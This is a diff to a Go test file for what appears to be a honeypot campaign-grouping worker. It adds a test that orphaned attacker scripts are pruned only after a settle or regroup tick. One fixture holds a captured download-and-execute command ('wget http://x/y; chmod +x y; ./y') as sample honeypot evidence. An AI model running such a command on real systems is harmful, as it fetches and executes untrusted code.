@@ -2,6 +2,7 @@ package campaign
 
 import (
 	"context"
+	"database/sql"
 	"errors"
 	"fmt"
 	"os"
@@ -299,8 +300,8 @@ func TestFamilyOfOnlyReadsInsideEvidenceRoot(t *testing.T) {
 	}
 }
 
-// A backlog reappearing after the first drain (a replace-ingest rewinds the
-// cursor, or a burst larger than one window) makes scheduled regroups wait
+// A backlog reappearing after the first drain (a replace-ingest re-inserts its
+// rows above the parked cursor, or a burst larger than one window) makes scheduled regroups wait
 // for it again; a Wake still regroups at once.
 func TestBacklogAfterDrainDefersScheduledRegroup(t *testing.T) {
 	st := openStore(t)
@@ -352,5 +353,64 @@ func TestFamilyOfFailsClosedOnCancel(t *testing.T) {
 	cancel()
 	if f := w.familyOf(ctx, "aa"); f != unclassified {
 		t.Fatalf("family %q", f)
+	}
+}
+
+// PruneOrphanScripts is a DELETE ... WHERE NOT EXISTS scan under writeMu.
+// Orphans only arise when a session settles under a new fingerprint or a
+// regroup rebuilds families, so an idle tick must not take the writer lock
+// for it; a tick that settled or regrouped still prunes.
+func TestPruneRunsOnlyAfterSettleOrRegroup(t *testing.T) {
+	st := openStore(t)
+	ctx := context.Background()
+	insertSharedKey(t, st, "cowrie:a", "cowrie:b")
+	w := NewWorker(st, 90, t.TempDir())
+	if err := w.Tick(ctx); err != nil { // drains the backlog and regroups
+		t.Fatal(err)
+	}
+	// An orphan script: a settled session whose rows retention then removed
+	// (the purge leaves scripts to the worker's prune).
+	old := time.Now().UTC().AddDate(0, 0, -120)
+	if err := st.InsertEvent(&models.Event{TS: old, Source: models.SourceCowrie, Kind: models.KindCommand, SessionID: "orph",
+		ActorID: "cowrie:z", SrcIP: "198.51.100.9", Command: "cd /tmp; wget http://x/y; chmod +x y; ./y; rm y"}); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := st.RecordCampaignEvidence(ctx, 5000); err != nil {
+		t.Fatal(err)
+	}
+	if n, err := st.SettleSessionScripts(ctx, time.Now().Add(time.Hour), 10); err != nil || n < 1 {
+		t.Fatalf("settle n=%d err=%v", n, err)
+	}
+	rows, err := st.SettledScriptRows(ctx)
+	if err != nil {
+		t.Fatal(err)
+	}
+	var fp string
+	for _, r := range rows {
+		if r.SessionID == "orph" {
+			fp = r.Fingerprint
+		}
+	}
+	if fp == "" {
+		t.Fatal("orph did not settle")
+	}
+	if err := st.MaintenancePurge(90); err != nil {
+		t.Fatal(err)
+	}
+	if _, err := st.GetScript(ctx, fp); err != nil {
+		t.Fatalf("orphan script must exist before the tick: %v", err)
+	}
+	if err := w.Tick(ctx); err != nil { // nothing to record, settle or regroup
+		t.Fatal(err)
+	}
+	if _, err := st.GetScript(ctx, fp); err != nil {
+		t.Fatalf("an idle tick pruned (took writeMu for nothing): %v", err)
+	}
+	w.Wake()
+	if err := w.Tick(ctx); err != nil { // regroups, so the gate opens
+		t.Fatal(err)
+	}
+	if _, err := st.GetScript(ctx, fp); !errors.Is(err, sql.ErrNoRows) {
+		t.Fatalf("orphan survived a regroup tick: %v", err)
 	}
 }
